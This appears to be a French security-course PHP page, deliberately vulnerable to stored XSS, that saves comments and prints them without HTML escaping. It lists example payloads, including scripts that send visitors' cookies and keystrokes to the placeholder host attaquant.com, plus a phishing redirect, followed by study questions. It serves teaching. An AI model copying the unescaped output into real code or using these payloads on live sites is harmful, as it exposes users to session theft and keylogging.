<?php
/**
 * PARTIE D - XSS STOCKE VULNERABLE
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Stockage direct du commentaire sans validation
 * - Affichage sans Echappement HTML
 * - XSS stockee (persistante)
 */

require_once __DIR__ . '/../init.php';
require_once __DIR__ . '/../functions.php';
include __DIR__ . '/../templates/header.php';

$message = '';

// Traitement de l'ajout de commentaire
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['commentaire'])) {
    $auteur = $_POST['auteur'] ?? 'Anonyme';
    $commentaire = $_POST['commentaire'] ?? '';
    
    // [VULNERABLE] VULNERABLE : Stockage direct sans validation ni Echappement
    $sql = "INSERT INTO commentaires (auteur, contenu, date_creation) VALUES (:auteur, :contenu, NOW())";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        'auteur' => $auteur,        // [VULNERABLE] Pas d'Echappement
        'contenu' => $commentaire    // [VULNERABLE] Pas d'Echappement
    ]);
    
    $message = '<div class="alert alert-success">Commentaire ajoute !</div>';
}

// Recuperation des commentaires
$stmt = $pdo->query("SELECT * FROM commentaires ORDER BY date_creation DESC");
$commentaires = $stmt->fetchAll();
?>

<h2> Partie D - XSS Stockee (Commentaires)</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Les commentaires sont affiches sans Echappement. XSS stockee possible !
</div>

<?= $message ?>

<h3>Ajouter un commentaire</h3>
<form method="POST">
    <label for="auteur">Votre nom :</label>
    <input type="text" name="auteur" id="auteur" placeholder="Votre nom">
    
    <label for="commentaire">Commentaire :</label>
    <textarea name="commentaire" id="commentaire" rows="4" placeholder="Votre commentaire..."></textarea>
    
    <button type="submit"> Publier</button>
</form>

<h3>Commentaires</h3>
<?php if (empty($commentaires)): ?>
    <p>Aucun commentaire pour le moment.</p>
<?php else: ?>
    <?php foreach ($commentaires as $c): ?>
        <div class="comment-box">
            <strong><?= $c['auteur'] ?></strong>
            <small>(<?= $c['date_creation'] ?>)</small>
            <p><?= $c['contenu'] ?></p>
        </div>
    <?php endforeach; ?>
<?php endif; ?>

<h3> Exploitation possible</h3>
<p>Postez ce commentaire malveillant :</p>

<div class="code-block">
<!-- XSS stockee simple -->
&lt;script&gt;alert('XSS Stockee!')&lt;/script&gt;

<!-- Vol de cookies de tous les visiteurs -->
&lt;script&gt;
new Image().src = 'http://attaquant.com/steal.php?cookie=' + document.cookie;
&lt;/script&gt;

<!-- Keylogger -->
&lt;script&gt;
document.onkeypress = function(e) {
    new Image().src = 'http://attaquant.com/log.php?key=' + e.key;
}
&lt;/script&gt;

<!-- Redirection -->
&lt;script&gt;window.location = 'http://attaquant.com/phishing.html'&lt;/script&gt;
</div>

<h3> Questions</h3>
<ol>
    <li>Quelle est la difference entre XSS reflte et XSS stockee ?</li>
    <li>Pourquoi la XSS stockee est-elle plus dangereuse ?</li>
    <li>Comement corriger cette faille  a l'affichage ?</li>
    <li>Faut-il aussi valider  a l'insertion ? Pourquoi ?</li>
</ol>

<p><a href="../secure/commentaire_secure.php">Voir la version securisee</a></p>

    </main>
    </main>\r\n</div>\r\n</body>\r\n</html>
